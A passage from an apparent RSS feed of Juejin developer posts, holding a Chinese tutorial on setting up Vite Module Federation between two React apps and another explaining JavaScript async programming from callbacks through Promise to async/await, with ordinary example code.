aRt+ZPYA+LO0mgxz5K1Ig+UgAzKIuGnz39z6S+olDeaibaXRsU1RUFvgx+GwTWgPCaDgMw2XXpr9gwq50XV0bkxJiYeEiNF5cwE5XsiOEkAUkXkUW51SSOVchjl8WKef604XFSRbzCGCYeCoESStv/p8QU1VPIM3knNDynctnBRfsEYhgSlNCIGgQv2UCkvGIHZgteMh1nBW9W4F16RAM6yDVV7amZTaYQcr59cuuhhWRTWBvAMLxQGeyFSHOLnh0MvUskz5RF+fbRYDEy0mZgqQYUHOLhr//b6rGoqeaLqQG0pw3PrBbyA+4EQUkRmhvgqNUfICUipKK4OKUqIJVPKB0jpEhjmWWp64jdbKmVZZNYogcJm493gsifOqhDyeh9GYR/FM7sW+DA5CKR0MSK3tvKZkpwB5gRE4tjFEr7RL0iWBGV51vHFCyupNGWWPqLgnoer9mtyEGSJAzwLllDTGzyznDjRN/CwOFkoFb4bm0eVIXICgpvdGoEvrF7fC89zfLkkeV5HbOhWiTwTpKYvCAJLGshRdXtKMKAWlyxq+MPQLk1h66g5RE5ABJYNFrqY3wvJklJRUKg5ZWLFXIA86yek2uDOPkBNb3CM5Pf7DL2QyIrUGiLH+xC5Bmmm/ARnHUhC6PnzxWDK0RH5HuIjZGy27erU9AZ0dTIWXyG+NpBBrSFySxZw220IqeUPFoS6jVAPNadM7yDsgNB1qOkLuAziMYIb1PQGA75wIaKGPyAb+9oF16g5RE5ALIQ+tSyLWoWDEAK6aXW3JlK9VJoyx1oyvVkNdvo5KXXDAVkdnaKmNwx0xjH98w3JNmTCm+Bc9hKVhsgJSI9pvp9Vdd++jmq6AXB2/HHrhcs5aTkVDv0DFzoHvKdq/mQsKX/4t7KJLDpOJW+IbAvMGoMkxfwAWZB8DT7W1diTE+WcgKz6pK1bs6z3daPwmJDsSKt6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-sulphurpool-dark">.hljs-comment,.hljs-quote{color:#898ea4}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#c94922}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#c76b29}.hljs-bullet,.hljs-string,.hljs-symbol{color:#ac9739}.hljs-section,.hljs-title{color:#3d8fd1}.hljs-keyword,.hljs-selector-tag{color:#6679cc}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#202746;color:#979db4}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Module Federation</h2>
<blockquote>
<p>Module Federation 的核心是  <strong>“打破构建边界，实现模块级的跨应用共享与协同”</strong> ，其最佳使用场景需满足以下特征：</p>
<ul>
<li>应用 / 模块由多团队独立开发维护；</li>
<li>需要复用公共依赖或组件，避免重复打包；</li>
<li>希望简化模块更新流程（免 npm 发布）；</li>
<li>需实现微前端、跨技术栈协作或模块级灰度发布。</li>
</ul>
</blockquote>
<blockquote>
<p>注意： 每个应用都可以在 Federation 中暴露 或者加载 远程可共享模块</p>
</blockquote>
<h3 data-id="heading-1">如何使用 vite 搭建 MF</h3>
<blockquote>
<p>项目 github 参考地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkejuqu%2Ffebe-repos" target="_blank" title="https://github.com/kejuqu/febe-repos" ref="nofollow noopener noreferrer">github.com/kejuqu/febe…</a></p>
</blockquote>
<h4 data-id="heading-2">创建两个应用 <code>vite-react</code> 和 <code>vite-react-provider</code></h4>
<ul>
<li><code>vite-react-provider</code> 暴露 Button 组件</li>
<li><code>vite-react</code> 使用 <code>vite-react-provider</code> 应用暴露的 Button 组件</li>
</ul>
<h4 data-id="heading-3"><code>vite-react-provider</code> 应用</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig, type <span class="hljs-title class_">PluginOption</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-react"</span>;
<span class="hljs-keyword">import</span> { federation } <span class="hljs-keyword">from</span> <span class="hljs-string">"@module-federation/vite"</span>;

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">3006</span>,
  },
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>({
      <span class="hljs-attr">babel</span>: {
        <span class="hljs-attr">plugins</span>: [[<span class="hljs-string">"babel-plugin-react-compiler"</span>]],
      },
    }),
    <span class="hljs-title function_">federation</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">"remote"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">"remoteEntry.js"</span>,
      <span class="hljs-comment">// exposes 暴露 组件或者使用的工具函数</span>
      <span class="hljs-attr">exposes</span>: {
        <span class="hljs-string">"./c-button"</span>: <span class="hljs-string">"./src/components/button.tsx"</span>,
      },
      <span class="hljs-attr">shared</span>: [<span class="hljs-string">"react"</span>, <span class="hljs-string">"react-dom"</span>],
    }) <span class="hljs-keyword">as</span> <span class="hljs-title class_">PluginOption</span>[],
  ],
});

<span class="hljs-comment">// src/components/button.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">props: React.ComponentProps&lt;<span class="hljs-string">"button"</span>&gt;</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> {<span class="hljs-attr">...props</span>}&gt;</span>button from remote<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
<h4 data-id="heading-4"><code>vite-react</code> 使用 React.Lazy + dynamic import 加载远程模块</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">"vite"</span>;
<span class="hljs-keyword">import</span> { federation } <span class="hljs-keyword">from</span> <span class="hljs-string">"@module-federation/vite"</span>;
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">"@vitejs/plugin-react"</span>;

<span class="hljs-comment">// https://vite.dev/config/</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">port</span>: <span class="hljs-number">3005</span>,
  },
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>({
      <span class="hljs-attr">babel</span>: {
        <span class="hljs-attr">plugins</span>: [[<span class="hljs-string">"babel-plugin-react-compiler"</span>]],
      },
    }),
    <span class="hljs-title function_">federation</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">"customer"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">"vite-react.js"</span>,
      <span class="hljs-comment">// // exposes 暴露 组件或者使用的工具函数</span>
      <span class="hljs-comment">// exposes: {</span>
      <span class="hljs-comment">//   "./utils": "./src/utils.tsx",</span>
      <span class="hljs-comment">// },</span>
      <span class="hljs-attr">remotes</span>: {
        <span class="hljs-attr">remote</span>: {
          <span class="hljs-attr">type</span>: <span class="hljs-string">"module"</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">"remote"</span>,
          <span class="hljs-attr">entry</span>: <span class="hljs-string">"http://localhost:3006/remoteEntry.js"</span>,
          <span class="hljs-attr">entryGlobalName</span>: <span class="hljs-string">"remote"</span>,
          <span class="hljs-attr">shareScope</span>: <span class="hljs-string">"default"</span>,
        },
      },
      <span class="hljs-attr">shared</span>: [<span class="hljs-string">"react"</span>, <span class="hljs-string">"react-dom"</span>],
    }),
  ],
});


<span class="hljs-comment">// src/App.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">"./App.css"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">RemoteBtn</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"remote/c-button"</span>));

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">React.Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">RemoteBtn</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> alert("clicked")} /&gt;
      <span class="hljs-tag">&lt;/<span class="hljs-name">React.Suspense</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<h4 data-id="heading-5">效果图</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58f03d0efca94ae68eadce1ff86b881a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y2D5p-v5qmY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491516&amp;x-signature=aLUFDZdcogXymuEubcgG3h7bQVo%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 JavaScript 中的异步编程：从回调到 async/await]]></title>    <link>https://juejin.cn/post/7575162322239995904</link>    <guid>https://juejin.cn/post/7575162322239995904</guid>    <pubDate>2025-11-23T08:35:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575162322239995904" data-draft-id="7575112613777997858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 JavaScript 中的异步编程：从回调到 async/await"/> <meta itemprop="keywords" content="Promise"/> <meta itemprop="datePublished" content="2025-11-23T08:35:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tzarevich"/> <meta itemprop="url" content="https://juejin.cn/user/578786070367529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 JavaScript 中的异步编程：从回调到 async/await
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578786070367529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tzarevich
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:35:05.000Z" title="Sun Nov 23 2025 08:35:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深入理解 JavaScript 中的异步编程：从回调到 async/await</h2>
<p>在现代 Web 开发中，异步操作无处不在——无论是从服务器获取数据、读取本地文件，还是处理用户交互。JavaScript 作为一门单线程语言，通过多种机制支持异步编程。本文将带你回顾异步编程的发展历程，并重点解析 <code>async/await</code> 这一 ES8 引入的强大语法糖。</p>
<hr/>
<h3 data-id="heading-1">1. 回调函数（Callback）时代：最初的异步方案</h3>
<p>早期的 JavaScript 主要依赖<strong>回调函数</strong>来处理异步操作。例如，在 Node.js 中使用 <code>fs.readFile</code> 读取文件：</p>
<pre><code class="hljs language-javascript" lang="javascript">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./1.html'</span>, <span class="hljs-string">'utf-8'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (err) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);
        <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>);
});
</code></pre>
<p>这种方式简单直接，但存在明显问题：</p>
<ul>
<li><strong>回调地狱（Callback Hell）</strong> ：多层嵌套导致代码难以阅读和维护。</li>
<li><strong>错误处理分散</strong>：每个回调都需要单独处理错误。</li>
</ul>
<hr/>
<h3 data-id="heading-2">2. Promise：ES6 带来的结构化异步</h3>
<p>为了解决回调地狱，ES6 引入了 <strong>Promise</strong> 对象，它代表一个异步操作的最终完成（或失败）及其结果值。</p>
<p>我们可以将 <code>fs.readFile</code> 封装成一个 Promise：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./1.html'</span>, <span class="hljs-string">'utf-8'</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) {
            <span class="hljs-title function_">reject</span>(err);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-title function_">resolve</span>(data);
    });
});

p.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>);
}).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
});
</code></pre>
<p>Promise 的优势：</p>
<ul>
<li>链式调用（<code>.then().then()</code>）</li>
<li>统一的错误处理（<code>.catch()</code>）</li>
<li>更清晰的异步流程控制</li>
</ul>
<p>但 <code>.then()</code> 链仍然不够“同步感”，尤其在复杂逻辑中仍显繁琐。</p>
<hr/>
<h3 data-id="heading-3">3. async / await：ES8 的终极优雅方案</h3>
<p>ES8（ECMAScript 2017）引入了 <strong><code>async</code> 和 <code>await</code></strong>，让异步代码写起来像同步代码一样直观。</p>
<h4 data-id="heading-4">基本用法</h4>
<ul>
<li><code>async</code> 用于声明一个函数为异步函数，该函数<strong>总是返回一个 Promise</strong>。</li>
<li><code>await</code> 只能在 <code>async</code> 函数内部使用，用于“等待”一个 Promise 被 resolve，并将其结果赋值给变量。</li>
</ul>
<p>例如，封装后的文件读取可以这样写：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> html = <span class="hljs-keyword">await</span> p; <span class="hljs-comment">// 等待 Promise 完成</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(html);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">111</span>);
    } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
    }
};
<span class="hljs-title function_">main</span>();
</code></pre>
<p>再比如，从 GitHub API 获取用户仓库信息：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">main</span> = async () =&gt; {
    try {
        const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'https://api.github.com/users/shunwuyu/repos'</span>)<span class="hljs-comment">;</span>
        const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
        console.log(data)<span class="hljs-comment">;</span>
    } catch (error) {
        console.error('请求失败:', error)<span class="hljs-comment">;</span>
    }
}<span class="hljs-comment">;</span>
main()<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-5">优势总结</h4>

























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>可读性强</strong></td><td>代码结构接近同步逻辑，易于理解和调试</td></tr><tr><td><strong>错误处理统一</strong></td><td>使用 <code>try...catch</code> 捕获异步错误</td></tr><tr><td><strong>避免回调地狱</strong></td><td>不再需要层层嵌套 <code>.then()</code></td></tr><tr><td><strong>与现有 Promise 兼容</strong></td><td><code>await</code> 后可接任何 Promise</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-6">4. 实际应用场景对比</h3>
<p>以获取 GitHub 用户仓库为例：</p>
<ul>
<li>
<p><strong>传统 Promise 链式写法</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">fetch('https://api.github.com/users/shunwuyu/repos')
  .then(<span class="hljs-attr">res</span> =&gt; res.json())
  .then(<span class="hljs-attr">data</span> =&gt; console.log(data))
  .catch(<span class="hljs-attr">err</span> =&gt; console.error(err))<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p><strong>async/await 写法</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">getRepos</span> = async () =&gt; {
    try {
        const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'https://api.github.com/users/shunwuyu/repos'</span>)<span class="hljs-comment">;</span>
        const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
        console.log(data)<span class="hljs-comment">;</span>
    } catch (err) {
        console.error(err)<span class="hljs-comment">;</span>
    }
}<span class="hljs-comment">;</span>
getRepos()<span class="hljs-comment">;</span>
</code></pre>
</li>
</ul>
<p>后者更接近自然语言：“先获取响应，再解析 JSON，最后打印数据”。</p>
<hr/>
<h3 data-id="heading-7">5. 注意事项</h3>
<ul>
<li><code>await</code> 只能在 <code>async</code> 函数内使用。</li>
<li><code>async</code> 函数总是返回 Promise，即使你 <code>return</code> 一个普通值。</li>
<li>多个不相关的异步操作应避免串行 <code>await</code>，可使用 <code>Promise.all()</code> 并行处理以提升性能。</li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ❌ 低效：串行执行</span>
const <span class="hljs-selector-tag">a</span> = await <span class="hljs-built_in">fetch</span>(url1);
const <span class="hljs-selector-tag">b</span> = await <span class="hljs-built_in">fetch</span>(url2);

<span class="hljs-comment">// ✅ 高效：并行执行</span>
const <span class="hljs-selector-attr">[res1, res2]</span> = await Promise<span class="hljs-selector-class">.all</span>([fetch(url1), <span class="hljs-built_in">fetch</span>(url2)]);
</code></pre>
<hr/>
<h3 data-id="heading-8">结语</h3>
<p>从回调函数到 Promise，再到 <code>async/await</code>，JavaScript 的异步编程模型不断演进，目标始终是：<strong>让异步代码更简洁、更安全、更易维护</strong>。如今，<code>async/await</code> 已成为现代前端和 Node.js 开发的标配。掌握它，不仅能提升开发效率，也能写出更具可读性和健壮性的代码。</p>
<blockquote>
<p>正如那句老话所说：“异步不可怕，可怕的是写得像同步却不是同步。”而 <code>async/await</code>，正是让异步“看起来像同步”的最佳实践。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[人人都能学AI，人人都要学AI]]></title>    <link>https://juejin.cn/post/7575106644499251234</link>    <guid>https://juejin.cn/post/7575106644499251234</guid>    <pubDate>2025-11-23T09:00:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644499251234" data-draft-id="7575162322240045056" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="人人都能学AI，人人都要学AI"/> <meta itemprop="keywords" content="AIGC,人工智能"/> <meta itemprop="datePublished" content="2025-11-23T09:00:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" 